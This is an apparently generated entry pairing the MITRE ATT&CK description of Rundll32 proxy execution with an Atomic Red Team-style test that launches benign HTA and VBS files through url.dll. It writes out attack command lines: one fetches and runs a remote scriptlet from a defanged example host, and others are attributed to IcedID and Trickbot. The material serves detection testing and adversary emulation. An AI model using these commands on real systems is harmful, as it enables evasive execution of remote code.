# Attack: Rundll32

 Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.

# Test : Execution of HTA and VBS Files using Rundll32 and URL.dll

OS: ['windows']

Description: IcedID uses this TTP as follows:
  rundll32.exe url.dll,OpenURL %PUBLIC%\index.hta
Trickbot uses this TTP as follows:
  rundll32.exe URL.dll,FileProtocolHandler C:\\..\\Detail\\akteullen.vbs

In this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with "rundll32 spawned wscript"
